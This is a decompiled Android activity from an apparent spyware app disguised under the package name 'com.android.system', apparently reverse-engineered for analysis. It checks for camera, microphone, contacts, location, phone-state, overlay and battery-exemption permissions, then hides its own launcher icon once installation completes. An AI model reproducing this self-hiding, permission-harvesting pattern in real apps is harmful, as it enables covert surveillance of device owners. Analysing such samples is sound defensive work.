package com.android.system;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.support.design.widget.NavigationView;
import android.support.design.widget.NavigationView.a;
import android.support.v4.content.ContextCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v4.widget.DrawerLayout.DrawerListener;
import android.support.v7.app.b;
import android.support.v7.app.e;
import android.support.v7.widget.Toolbar;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.ImageView;
import com.app.system.common.h;
import com.security.d.a;

public class StartActivity
  extends e
  implements NavigationView.a
{
  private a a = null;
  private boolean b = false;
  
  private boolean f()
  {
    Object localObject = new String[6];
    localObject[0] = "android.permission.WRITE_EXTERNAL_STORAGE";
    localObject[1] = "android.permission.READ_CONTACTS";
    localObject[2] = "android.permission.CAMERA";
    localObject[3] = "android.permission.RECORD_AUDIO";
    localObject[4] = "android.permission.ACCESS_FINE_LOCATION";
    localObject[5] = "android.permission.READ_PHONE_STATE";
    int i = localObject.length;
    for (int j = 0; j < i; j++) {
      if (ContextCompat.checkSelfPermission(this, localObject[j]) != 0)
      {
        bool1 = false;
        break label71;
      }
    }
    boolean bool1 = true;
    label71:
    boolean bool2 = bool1;
    if (bool1) {
      if (Build.VERSION.SDK_INT <= 16)
      {
        bool2 = true;
      }
      else
      {
        bool2 = bool1;
        if (!PermissionActivity.a(this)) {
          bool2 = false;
        }
      }
    }
    bool1 = bool2;
    if (bool2)
    {
      bool1 = bool2;
      if (Build.VERSION.SDK_INT >= 23)
      {
        bool1 = bool2;
        if (!Settings.canDrawOverlays(this)) {
          bool1 = false;
        }
      }
    }
    bool2 = bool1;
    if (bool1) {
      if (Build.VERSION.SDK_INT <= 16)
      {
        bool2 = true;
      }
      else
      {
        bool2 = bool1;
        if (!PermissionActivity.b(this)) {
          bool2 = false;
        }
      }
    }
    bool1 = bool2;
    if (bool2)
    {
      bool1 = bool2;
      if (Build.VERSION.SDK_INT >= 23)
      {
        Context localContext = getApplicationContext();
        localObject = localContext.getPackageName();
        bool1 = bool2;
        if (!((PowerManager)localContext.getSystemService("power")).isIgnoringBatteryOptimizations((String)localObject)) {
          bool1 = false;
        }
      }
    }
    return bool1;
  }
  
  private void g()
  {
    getPackageManager().setComponentEnabledSetting(new ComponentName(this, StartActivity.class), 2, 1);
  }
  
  public boolean a(MenuItem paramMenuItem)
  {
    int i = paramMenuItem.getItemId();
    if ((i != 2131230826) && (i != 2131230827) && (i != 2131230831) && (i != 2131230828)) {}
    ((DrawerLayout)findViewById(2131230783)).closeDrawer(8388611);
    return true;
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    this.a = new a();
    registerReceiver(this.a, new IntentFilter("com.system.services.action.GRANT_OK"));
    this.b = true;
    a.d("StartActivity", "Creato receiver", new Object[0]);
    setContentView(2131361819);
    Object localObject = (Toolbar)findViewById(2131230914);
    a((Toolbar)localObject);
    paramBundle = (DrawerLayout)findViewById(2131230783);
    localObject = new b(this, paramBundle, (Toolbar)localObject, 2131558464, 2131558463);
    paramBundle.addDrawerListener((DrawerLayout.DrawerListener)localObject);
    ((b)localObject).a();
    ((NavigationView)findViewById(2131230832)).setNavigationItemSelectedListener(this);
    if (f()) {
      a.d("StartActivity", "Tutti i permessi sono accordati", new Object[0]);
    }
    ((ImageView)findViewById(2131230808)).setOnClickListener(new View.OnClickListener()
    {
      public void onClick(View paramAnonymousView)
      {
        BootBroadcast.a(StartActivity.this);
      }
    });
    ((ImageView)findViewById(2131230797)).setOnClickListener(new View.OnClickListener()
    {
      public void onClick(View paramAnonymousView)
      {
        paramAnonymousView = StartActivity.this;
        h.a(paramAnonymousView, paramAnonymousView.getResources().getString(2131558474), StartActivity.this.getResources().getString(2131558475), new DialogInterface.OnClickListener()
        {
          public void onClick(DialogInterface paramAnonymous2DialogInterface, int paramAnonymous2Int)
          {
            paramAnonymous2DialogInterface.dismiss();
          }
        });
      }
    });
    ((ImageView)findViewById(2131230928)).setOnClickListener(new View.OnClickListener()
    {
      public void onClick(View paramAnonymousView)
      {
        paramAnonymousView = new Intent("android.intent.action.VIEW", Uri.parse(StartActivity.this.getResources().getString(2131558448)));
        StartActivity.this.startActivity(paramAnonymousView);
      }
    });
  }
  
  public boolean onCreateOptionsMenu(Menu paramMenu)
  {
    getMenuInflater().inflate(2131427329, paramMenu);
    return true;
  }
  
  protected void onDestroy()
  {
    super.onDestroy();
    if (this.b)
    {
      a.d("StartActivity", "onDestroy: receiver registrato -- elimina", new Object[0]);
      unregisterReceiver(this.a);
      this.b = false;
    }
    else
    {
      a.d("StartActivity", "onDestroy: receiver non registrato", new Object[0]);
    }
  }
  
  public boolean onOptionsItemSelected(MenuItem paramMenuItem)
  {
    if (paramMenuItem.getItemId() == 2131230743) {
      return true;
    }
    return super.onOptionsItemSelected(paramMenuItem);
  }
  
  public class a
    extends BroadcastReceiver
  {
    public a() {}
    
    public void onReceive(Context paramContext, Intent paramIntent)
    {
      StartActivity.this.finish();
      StartActivity.a(StartActivity.this);
      paramContext = paramContext.getSharedPreferences("pref", 0).edit();
      paramContext.putBoolean("installation-completed", true);
      paramContext.commit();
    }
  }
}


/* Location:              ~/com/android/system/StartActivity.class
 *
 * Reversed by:           J
 */